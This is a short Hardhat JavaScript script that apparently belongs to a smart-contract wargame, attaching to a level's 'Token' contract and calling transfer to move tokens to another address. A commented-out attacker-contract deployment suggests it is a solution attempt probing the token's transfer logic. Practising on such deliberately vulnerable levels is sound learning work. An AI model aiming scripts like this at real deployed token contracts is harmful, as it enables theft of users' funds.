const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0xE067a5c0d9c403d15892bBf7A7FfAe841A5A4eB5";
    contractName = "Token";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    // const Attacker = await hre.ethers.getContractFactory("AttackerTelephone");
    // const attacker = await Attacker.deploy(levelAddress);
    // console.log(`Attacker at ${attacker.address}`);

    let tx = await level.transfer("0x63bE8347A617476CA461649897238A31835a32CE",20);
    let tr = await tx.wait();
    console.log(await level.balanceOf(account.address));

    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
